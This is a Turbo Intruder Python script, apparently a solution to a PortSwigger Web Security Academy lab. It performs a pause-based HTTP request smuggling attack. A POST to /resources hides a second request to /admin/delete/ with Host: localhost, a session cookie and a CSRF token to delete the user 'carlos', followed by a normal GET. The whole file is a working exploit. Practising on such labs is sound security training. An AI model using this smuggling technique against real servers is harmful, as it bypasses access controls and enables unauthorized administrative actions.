def queueRequests(target, _):
    engine = RequestEngine(endpoint="https://0ae60053033c194a8028fd1a005a0024.web-security-academy.net:443",
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # attack request
    attack_request = """POST /resources HTTP/1.1
Host: 0ae60053033c194a8028fd1a005a0024.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: %s

%s"""

    # smuggled request POST
    smuggled_request = """POST /admin/delete/ HTTP/1.1
Content-Length: 53
Cookie: session=fysOrJlUg3yB0ysnn48lk5bBv7zazj34
Host: localhost

csrf=DJpsiHGuJBYEHxKaAsfOFluJkICjZXUk&username=carlos

"""

    # normal request
    normal_request = """GET / HTTP/1.1
Host: 0ae60053033c194a8028fd1a005a0024.web-security-academy.net

"""
    engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nPOST'], pauseTime=61000)
    engine.queue(normal_request)


def handleResponse(req, _):
    table.add(req)
